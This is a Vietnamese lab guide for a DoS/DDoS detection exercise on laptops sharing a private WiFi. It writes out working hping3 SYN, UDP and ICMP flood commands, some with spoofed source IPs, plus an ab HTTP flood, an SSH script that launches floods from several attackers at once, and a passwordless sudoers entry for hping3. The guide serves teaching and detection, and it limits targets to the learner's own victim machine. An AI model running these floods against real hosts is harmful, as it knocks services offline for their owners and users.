# Chạy lab trên NHIỀU MÁY THẬT (qua WiFi)

Hướng dẫn chạy lab DoS/DDoS bằng các **laptop thật** nối chung 1 WiFi, thay cho (hoặc song song
với) mô hình Docker. Giữ NGUYÊN mọi script: `attacks/*.py` và `detection/detector.py` chạy trực
tiếp trên Linux thật, chỉ cần truyền đúng tham số. Không dùng netplan, không đặt IP tĩnh — IP do
DHCP cấp (động), mọi IP truyền qua tham số lúc chạy.

> ⚠️ CHỈ DÙNG TRONG LAB CÔ LẬP. Chỉ nhắm vào máy `victim` của chính mình, trên WiFi riêng. Không bao
> giờ nhắm tới máy/dịch vụ không thuộc sở hữu của bạn.

## 1. Mô hình 3 máy

```
         WiFi riêng (vd 192.168.1.0/24, DHCP)
   +------------------+   +------------------+   +------------------+
   | victim           |   | attacker1        |   | attacker2 (thêm  |
   | nginx + detector |   | syn/http flood   |   | sau, tùy chọn)   |
   +------------------+   +------------------+   +------------------+
```

| Vai trò   | Máy        | Chạy gì                                        | Cần cài |
|-----------|------------|------------------------------------------------|---------|
| victim    | 1 laptop   | nginx (web đích) + `detector.py` (sniff WiFi)  | nginx, python3-scapy, tcpdump |
| attacker1 | 1 laptop   | `hping3` (L3/L4) / `ab` (L7 HTTP)              | hping3, apache2-utils |
| attacker2 | thêm sau   | giống attacker1                                | hping3, apache2-utils |

Bắt đầu với **2 máy** (1 victim + 1 attacker1) là đủ chạy kịch bản A, B, và C-1-nguồn. Thêm máy
thứ 3 (attacker2) khi nào cần C thành DDoS thật (xem mục 7).

## 2. Tìm IP và kiểm tra mạng

Trên MỖI máy, xem IP + tên card WiFi:

```bash
ip -brief addr            # cột 1 = tên card (vd wlan0, wlp2s0); cột 3 = IP (vd 192.168.1.50/24)
```

Card WiFi thường tên `wlan0` hoặc `wlpXsY`. Ghi lại:
- IP victim     = vd `192.168.1.50`
- card victim   = vd `wlan0`
- IP attacker1  = vd `192.168.1.61`

Kiểm tra thông mạng (từ attacker ping victim, và mở web):

```bash
ping -c 3 192.168.1.50                      # phải thấy reply
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.1.50   # phải là 200 (nginx victim sống)
```

Nếu ping không thông: xem mục 11 (gỡ lỗi).

## 3. Phần mềm cần cài

Trên **victim**:
```bash
sudo apt update
sudo apt install -y nginx python3-scapy tcpdump
sudo systemctl enable --now nginx           # nginx phục vụ ở cổng 80
```

Trên **mỗi attacker**:
```bash
sudo apt update
sudo apt install -y hping3 apache2-utils
```

## 4. Deploy repo lên mỗi máy

Mỗi máy cần thư mục `attacks/` (attacker) và `detection/` (victim). Cách đơn giản: clone repo:

```bash
git clone <URL_REPO> ~/dos-ddos-project
```

Mặc định các lệnh bên dưới giả sử repo ở `~/dos-ddos-project`. Nếu clone chỗ khác, đổi tham số
đường dẫn cho phù hợp (và đặt biến `REMOTE_REPO` khi dùng `run_ddos_remote.sh`).

## 5. Chạy detector trên victim

Chạy trong 1 terminal trên máy victim (thay `wlan0` + IP victim cho đúng máy bạn):

```bash
sudo python3 ~/dos-ddos-project/detection/detector.py \
    --iface wlan0 --victim 192.168.1.50 --pps 40 --syn 25
```

- `--iface wlan0`  : sniff card WiFi thật (khác Docker dùng `eth0`).
- `--victim <ip>`  : chỉ đếm gói đi VÀO victim (loại gói victim tự trả về) → n_src/ack chính xác.
- `sudo`           : sniff cần quyền root.
- Thêm `--csv ~/run.csv` nếu muốn ghi log; thêm `--ml ~/dos-ddos-project/detection/window_model.joblib`
  nếu đã train model (tùy chọn).

Engine mặc định là `scapy` (ổn định trên WiFi). `--engine ebpf` (XDP) có thể KHÔNG attach được trên
card WiFi (nhiều driver không hỗ trợ XDP native); nếu muốn thử thì thêm `--engine ebpf`, lỗi thì quay
lại scapy.

## 6. Chạy các kịch bản thực tế (100% dùng hping3 và ab)

Thay `192.168.1.50` bằng IP victim thật. Chạy các lệnh kiểm thử TRÊN MÁY ATTACKER:

### A — DoS TCP SYN Flood (1 nguồn)
```bash
sudo hping3 -S -p 80 -i u2000 192.168.1.50
```
Detector: `n_src=1` → **DoS** `[SYN flood]`. Thêm `--flood` nếu muốn tốc độ tối đa.

### B — DDoS TCP SYN Flood (IP Spoofing hoặc 2 máy cùng bắn)
```bash
# 1 máy dùng spoof ngẫu nhiên IP:
sudo hping3 -S -p 80 --rand-source -i u2000 192.168.1.50
# Hoặc cả Attacker 1 và Attacker 2 cùng chạy lệnh ở kịch bản A.
```
Detector: nhiều IP nguồn → `n_src>=2`, Entropy $H(src)$ cao → **DDoS** `[SYN flood]`.

### C — DDoS L7 HTTP Flood (Apache Benchmark)
```bash
ab -k -c 50 -n 30000 http://192.168.1.50/
```
HTTP là kết nối TCP thật. Khi cả 2 máy attacker cùng chạy lệnh này: `n_src=2` → hiện **DDoS** `[HTTP Flood (L7)]`. Web service latency tăng vọt. `ab` KHÔNG cần quyền `sudo`.

### D — UDP Flood (L4 Volumetric)
```bash
# DoS (1 nguồn):
sudo hping3 --udp -p 80 -i u2000 192.168.1.50
# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
sudo hping3 --udp -p 80 --rand-source -i u2000 192.168.1.50
```
Detector: `pps` cao, **`udp_s` cao**, `syn/s` và `ack/s` ~0 → tag **`[UDP flood]`**.

### E — ICMP Echo Flood (Ping Flood L3)
```bash
# DoS (1 nguồn):
sudo hping3 --icmp -i u2000 192.168.1.50
# Hoặc dùng ping flood chuẩn Linux:
sudo ping -f -s 1024 192.168.1.50
# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
sudo hping3 --icmp --rand-source -i u2000 192.168.1.50
```
Detector: `pps` cao nhưng `SYN=0, ACK=0, UDP=0` → nhận diện **`[ICMP Flood (L3)]`**.

> LƯU Ý (volumetric trong lab): nginx chỉ phục vụ TCP cổng 80, **không xử lý UDP**, nên gói UDP tới
> victim bị kernel bỏ (hoặc trả ICMP port-unreachable). Trong lab WiFi băng thông thừa, UDP flood
> **không làm sập** victim — nó minh họa **nhận dạng** loại tấn công volumetric (tag `[UDP flood]`),
> không phải gây sập. Muốn thật sự nghẽn phải bão hòa băng thông đường truyền (quy mô lớn hơn nhiều).

## 7. Hai máy bây giờ vs thêm máy thứ 3

- **2 máy (1 victim + 1 attacker):** chạy được A (DoS), B (DDoS qua spoof), và C với 1 nguồn
  (detector sẽ báo DoS vì n_src=1). Đủ để minh họa phân loại DoS/DDoS và nhận dạng SYN vs L7.
- **Thêm máy thứ 3 (attacker2):** chỉ cần (1) cài phần mềm mục 3, (2) clone repo mục 4, (3) chạy
  lệnh tấn công trên CẢ 2 máy attacker cùng lúc. **KHÔNG đổi gì** ở victim/detector/script. Lúc đó
  C chạy từ 2 nguồn thật → `n_src=2` → **DDoS L7 thật**.

Chạy 2 attacker cùng lúc tiện nhất bằng orchestrator SSH (mục dưới): chỉ cần thêm một cờ `-a`.

## 8. Chạy nhiều attacker cùng lúc bằng `run_ddos_remote.sh`

`run_ddos_remote.sh` (ở gốc repo) bắn SONG SONG từ nhiều máy attacker qua SSH. Đặt và chạy trên máy
ĐIỀU KHIỂN (tiện nhất là chính máy victim — nó đã có repo).

### 8.1. Tạo SSH key một lần (để không bị hỏi mật khẩu lúc bắn song song)
Trên máy điều khiển:
```bash
ssh-keygen -t ed25519            # Enter hết; tạo key nếu chưa có
ssh-copy-id user@192.168.1.61    # lặp lại cho mỗi attacker
ssh-copy-id user@192.168.1.62
ssh user@192.168.1.61 true       # kiểm tra: vào được không cần mật khẩu
```

### 8.2. Chạy
```bash
# 1 attacker, SYN:
./run_ddos_remote.sh syn  -t 192.168.1.50 -d 30 -a user@192.168.1.61

# 2 attacker, HTTP (DDoS L7 thật, n_src=2):
./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62

# UDP flood (volumetric, cần raw socket giống SYN — xem mục 9):
./run_ddos_remote.sh udp  -t 192.168.1.50 -d 30 -a user@192.168.1.61

# thêm máy thứ 3 sau này: chỉ thêm 1 cờ -a nữa
./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62 -a user@192.168.1.63
```
Các cờ: `-t` IP victim, `-d` giây, `-a` user@ip (lặp lại), `-r` pps/nguồn cho SYN và UDP (mặc định
400), `-s` thêm sudo cho SYN/UDP (chỉ khi dùng NOPASSWD sudoers thay vì CAP_NET_RAW — mục 9). Repo
trên máy attacker mặc định `~/dos-ddos-project`; đổi bằng biến `REMOTE_REPO=/đường/dẫn ./run_ddos_remote.sh ...`.

## 9. Quyền hạn khi chạy hping3 (sudo / raw socket)

`hping3` mở raw socket để tạo gói L3/L4 nên cần quyền root (`sudo`). `ab` là HTTP client tầng ứng dụng thông thường nên KHÔNG cần sudo.

- **Chạy trực tiếp bằng tay trên máy attacker:** Thêm `sudo` trước lệnh `hping3`: `sudo hping3 ...`
- **Bắn tự động qua SSH (`run_ddos_remote.sh`):** Cần cấp quyền chạy hping3 không hỏi mật khẩu:
```bash
# Trên máy attacker:
sudo setcap cap_net_raw+eip "$(command -v hping3)"
# Hoặc thêm vào sudoers:
echo "$USER ALL=(root) NOPASSWD: /usr/sbin/hping3, /usr/bin/hping3" | sudo tee /etc/sudoers.d/dos-lab
sudo chmod 440 /etc/sudoers.d/dos-lab
```
Rồi bắn kèm `-s`: `./run_ddos_remote.sh syn ... -s`. Cách này cũng nới quyền (cho chạy python3 bất
kỳ dưới root không mật khẩu) → chỉ dùng trên máy lab, gỡ file sudoers khi xong.

## 10. Khác biệt so với Docker

- **Sniff NIC thật:** detector sniff thẳng card WiFi (`--iface wlan0`), không dùng chung namespace
  như Docker. Không còn vấn đề "SYN-ACK của victim bị đếm thành nguồn" theo kiểu netns — nhưng bộ lọc
  `--victim <ip>` vẫn cần để loại gói victim tự trả về.
- **XDP:** trong Docker chạy XDP-generic trên veth. Trên máy thật, card có dây (eth0) có thể chạy
  XDP native (nhanh hơn); card WiFi thường KHÔNG hỗ trợ XDP native → dùng `scapy` (mặc định) cho an
  toàn.
- **Không có orchestrator Docker:** `run_ddos.sh`, `experiments/run_scenarios.py`, `dashboard/` đều
  dùng `docker exec` → KHÔNG dùng cho máy thật. Máy thật dùng `run_ddos_remote.sh` + chạy tay.
- **IP động (DHCP):** mọi IP truyền qua tham số lúc chạy; không đặt IP tĩnh, không netplan.

## 11. An toàn & gỡ lỗi thường gặp

- **Chỉ nhắm victim của mình, WiFi riêng.** Không nhắm IP lạ.
- **ping không thông:** cùng WiFi chưa? AP bật "AP/client isolation" (chặn máy-tới-máy)? Tắt tính
  năng đó trên router, hoặc dùng một AP/hotspot khác.
- **curl victim không ra 200:** nginx chưa chạy (`sudo systemctl status nginx`), hoặc firewall chặn
  cổng 80 (`sudo ufw status`; lab thì có thể `sudo ufw disable`).
- **syn_flood báo PermissionError / Operation not permitted:** quên `sudo` (chạy tay), hoặc chưa cấu
  hình CAP_NET_RAW/NOPASSWD (khi qua SSH) — xem mục 9.
- **B không ra nhiều nguồn (n_src~1):** AP lọc gói spoof (bình thường trên WiFi) → dùng nhiều
  attacker thật thay vì spoof.
- **detector in pps=0 khi đang bị tấn công:** sai `--iface` (không phải card đang nhận traffic) hoặc
  sai `--victim` (IP victim đổi do DHCP) → chạy lại `ip -brief addr` lấy IP/card đúng.
- **run_ddos_remote.sh báo không SSH được:** chưa `ssh-copy-id` tới máy đó, hoặc sai `user@ip`.
- **Còn sót tiến trình sau khi chạy:** `ssh user@ip 'pkill -f flood.py'` (hoặc `pkill -f flood.py`
  trên máy chạy tay).
